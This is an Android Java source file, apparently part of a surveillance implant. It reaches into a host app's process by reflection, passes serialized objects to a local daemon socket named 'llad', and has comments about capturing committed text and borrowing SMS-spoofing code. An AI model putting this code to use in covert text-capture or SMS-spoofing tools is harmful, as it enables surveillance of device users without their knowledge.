package phone.android.com;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.sql.Time;
import java.util.Calendar;
import java.util.GregorianCalendar;
import java.util.HashMap;

import android.app.Activity;
import android.app.Application;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.database.Cursor;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.provider.ContactsContract;
import android.util.Log;

import com.android.dvci.util.LowEventHandlerDefs;


// takes strings from committext

public class Iprocess {
	private static String TAG = "Iprocess";

	/**
	 * msleep.
	 *
	 * @param t ms to msleep
	 */
	public static void msleep(final int t) {
		try {
			Thread.sleep(t);
		} catch (final InterruptedException e) {
			Log.w(TAG, " sleep() throwed an exception");//$NON-NLS-1$
		}
	}

	public static Application getcon() {
		try {
			final Class<?> activityThreadClass =
					Class.forName("android.app.ActivityThread");
			if (activityThreadClass == null)
				Log.d(TAG, "activityThreadClass == null");
			final Method method = activityThreadClass.getMethod("currentApplication");
			Application app = (Application) method.invoke(null, (Object[]) null);
			if (app == null) {
				Log.d(TAG, "getcon app == null");
				final Method method2 = activityThreadClass.getMethod("getApplication");
				if (method2 == null)
					Log.d(TAG, "method2 == null");
				if (app == null) {
					Log.d(TAG, "getcon 2 app == null");
					try {
						Field f = activityThreadClass.getField("mInitialApplication");
						app = (Application) f.get(activityThreadClass);
					} catch (Exception e) {
					}
				}
				if (app == null)
					Log.d(TAG, "getcon 3 app == null");
			}
			return app;
		} catch (final ClassNotFoundException e) {
			// handle exception
			Log.d(TAG, e.toString());
		} catch (final NoSuchMethodException e) {
			// handle exception
			Log.d(TAG, e.toString());
		} catch (final IllegalArgumentException e) {
			// handle exception
			Log.d(TAG, e.toString());
		} catch (final IllegalAccessException e) {
			// handle exception
			Log.d(TAG, e.toString());
		} catch (final InvocationTargetException e) {
			// handle exception
			Log.d(TAG, e.toString());
		}
		Log.d(TAG, "getcon == null :-(");
		return null;
	}

	static int hexCharToInt(char c) {
		if (c >= '0' && c <= '9') return (c - '0');
		if (c >= 'A' && c <= 'F') return (c - 'A' + 10);
		if (c >= 'a' && c <= 'f') return (c - 'a' + 10);
		throw new RuntimeException("invalid hex char '" + c + "'");
	}

	public static byte[] hexStringToBytes(String s) {
		byte[] ret;

		if (s == null) return null;

		int sz = s.length();

		ret = new byte[sz / 2];

		for (int i = 0; i < sz; i += 2) {
			ret[i / 2] = (byte) ((hexCharToInt(s.charAt(i)) << 4)
					| hexCharToInt(s.charAt(i + 1)));
		}

		return ret;
	}


	private static LowEventHandlerDefs sendSerialObj(LowEventHandlerDefs obj) {
		if (obj == null) {
			return null;
		}
		LocalSocket sender = new LocalSocket();
		obj.res = 1;
		try {
			sender.connect(new LocalSocketAddress("llad"));
			Log.d(TAG, "SENT DATA ");
			int timeout = 5;
			Log.d(TAG, "wait connection..");
			while (timeout-- > 0) {
				if (sender.isBound() && sender.isConnected()) {
					break;
				} else {
					Log.d(TAG, ".");
				}
				msleep(100);
			}
			if (!(sender.isBound() && sender.isConnected())) {
				Log.d(TAG, " (connection failed): ");//$NON-NLS-1$
				return obj;
			}
			DataInputStream streamIn = new DataInputStream(new
					BufferedInputStream(sender.getInputStream()));
			DataOutputStream streamOut = new DataOutputStream(new
					BufferedOutputStream(sender.getOutputStream()));
			ObjectOutputStream oos = new ObjectOutputStream(streamOut);
			oos.writeObject(obj);
			oos.flush();
			streamOut.flush();
			Log.d(TAG, " (object sent): ");//$NON-NLS-1$
			obj = null;
			timeout = 10;
			int available = 0;
			while (timeout-- > 0 && available <= 0) {
				try {
					if (sender.isBound() && sender.isConnected()) {
						try {
							available = streamIn.available();
							Log.d(TAG, " (getAvailable): " + available);//$NON-NLS-1$
							if (available > 0) {

								ObjectInputStream ois = new ObjectInputStream(streamIn);
								obj = (LowEventHandlerDefs) ois.readObject();
								Log.d(TAG, "GOT DATA " + obj);
							}
						} catch (Exception e) {
							Log.d(TAG, " (is available) Error: ", e);//$NON-NLS-1$
						}
					} else {
						Log.d(TAG, " (getAvailable) sender not connected");//$NON-NLS-1$
					}

				} catch (Exception e) {
					Log.d(TAG, " (getAvailable) Error: ", e);//$NON-NLS-1$
				}
				msleep(100);
			}
			Log.d(TAG, " (exiting): t=" + timeout + " a=" + available);//$NON-NLS-1$
			msleep(100);
		} catch (Exception e) {
			Log.d(TAG, " (LocalSocketAddress) Error: ", e);//$NON-NLS-1$
		}
		return obj;
	}


	//
	// reverseBytes and createFakesSms code taken from Thomas Cannon's SMSSpoof.java
	// https://github.com/thomascannon/android-sms-spoof/blob/master/SMSSpoofer/src/net/thomascannon/smsspoofer/SMSSpoof.java
	//
	private static byte reverseByte(byte b) {
		return (byte) ((b & 0xF0) >> 4 | (b & 0x0F) << 4);
	}

	public static boolean transact(int code, Parcel data, Parcel reply,int flags){
		Log.d(TAG, "called transact code="+code+" flags="+flags);
		return true;
	}
}
